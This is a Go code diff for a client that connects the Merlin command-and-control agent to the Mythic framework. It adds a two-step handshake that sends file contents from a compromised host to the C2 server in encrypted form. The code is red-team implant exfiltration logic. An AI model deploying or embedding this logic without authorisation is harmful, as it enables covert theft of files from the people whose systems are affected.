@@ -65,6 +65,15 @@ type PubSubClient struct {
 	checkinDone     bool
 	listenerStarted bool
 	usedRSAStaging  bool // true if key was obtained via RSA staging
+
+	// Pending file downloads waiting for Mythic file_id (phase 2 of download handshake)
+	pendingDownloads sync.Map // task_id (string) -> pendingDownloadData
+}
+
+// pendingDownloadData holds file info between DownloadInit and DownloadSend phases
+type pendingDownloadData struct {
+	fileBlob string
+	fullPath string
 }
 
 // NewPubSubClient creates a new pub/sub client for Merlin.
@@ -819,6 +828,57 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 						}
 					}
 				}
+
+				// Handle DownloadInit ack: Mythic returns file_id in "responses" array
+				if responsesInterface, ok := taskData["responses"]; ok {
+					if responsesArray, ok := responsesInterface.([]interface{}); ok {
+						for _, respInterface := range responsesArray {
+							respMap, ok := respInterface.(map[string]interface{})
+							if !ok {
+								continue
+							}
+							if core.Verbose {
+								color.Yellow(fmt.Sprintf("[DEBUG] Mythic response entry: %v", respMap))
+							}
+							fileID, hasFileID := respMap["file_id"].(string)
+							taskID, hasTaskID := respMap["task_id"].(string)
+							if !hasFileID || fileID == "" || !hasTaskID {
+								continue
+							}
+							pendingInterface, ok := p.pendingDownloads.Load(taskID)
+							if !ok {
+								continue
+							}
+							pending := pendingInterface.(pendingDownloadData)
+							p.pendingDownloads.Delete(taskID)
+							if core.Verbose {
+								color.Green(fmt.Sprintf("[+] Received file_id %s for task %s, sending chunk data", fileID, taskID))
+							}
+							// Phase 2: send the actual file data
+							downloadSendMsg := map[string]interface{}{
+								"action": "post_response",
+								"responses": []interface{}{
+									map[string]interface{}{
+										"task_id":     taskID,
+										"completed":   true,
+										"status":      "success",
+										"user_output": fmt.Sprintf("File uploaded: %s", pending.fullPath),
+										"download": map[string]interface{}{
+											"file_id":    fileID,
+											"chunk_num":  1,
+											"chunk_data": pending.fileBlob,
+										},
+									},
+								},
+							}
+							if err := p.sendMythicMsg(downloadSendMsg); err != nil {
+								if core.Verbose {
+									color.Red(fmt.Sprintf("[-] Failed to send DownloadSend for task %s: %v", taskID, err))
+								}
+							}
+						}
+					}
+				}
 			}
 		}()
 
@@ -842,6 +902,27 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 	}
 
 	return pendingJobs, nil
+}
+
+// sendMythicMsg encrypts, frames, and publishes a Mythic-format message map.
+func (p *PubSubClient) sendMythicMsg(mythicMsg map[string]interface{}) error {
+	jsonBody, err := json.Marshal(mythicMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal: %w", err)
+	}
+	var frame string
+	if p.encryptionMode == "none" {
+		frame = buildMythicFrame(p.agentID, jsonBody)
+	} else if p.psk != nil {
+		encrypted, err := aesEncrypt(p.psk, jsonBody)
+		if err != nil {
+			return fmt.Errorf("failed to encrypt: %w", err)
+		}
+		frame = buildMythicFrame(p.agentID, encrypted)
+	} else {
+		return fmt.Errorf("no encryption key available for mode: %s", p.encryptionMode)
+	}
+	return p.transport.SendRaw(frame)
 }
 
 // Send sends a Merlin message to Mythic, encrypted (or plaintext) and framed.
@@ -976,21 +1057,30 @@ func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]inter
 
 			case jobs.FILETRANSFER:
 				ft := job.Payload.(jobs.FileTransfer)
-				response := map[string]interface{}{
-					"task_id":   job.ID,
-					"completed": true,
-					"status":    "success",
-				}
 				if ft.IsDownload {
-					response["user_output"] = fmt.Sprintf("File uploaded: %s", ft.FileLocation)
-				} else {
-					response["user_output"] = fmt.Sprintf("File downloaded: %s", ft.FileLocation)
-					response["download"] = map[string]interface{}{
-						"path": ft.FileLocation,
-						"data": ft.FileBlob,
+					// Phase 1 of download: send DownloadInit to get a file_id from Mythic.
+					// Store file data; phase 2 (DownloadSend) fires when file_id arrives.
+					p.pendingDownloads.Store(job.ID, pendingDownloadData{
+						fileBlob: ft.FileBlob,
+						fullPath: ft.FileLocation,
+					})
+					response := map[string]interface{}{
+						"task_id": job.ID,
+						"download": map[string]interface{}{
+							"total_chunks": 1,
+							"full_path":    ft.FileLocation,
+						},
 					}
+					responses = append(responses, response)
+				} else {
+					response := map[string]interface{}{
+						"task_id":     job.ID,
+						"user_output": fmt.Sprintf("File downloaded: %s", ft.FileLocation),
+						"completed":   true,
+						"status":      "success",
+					}
+					responses = append(responses, response)
 				}
-				responses = append(responses, response)
 			}
 		}
 
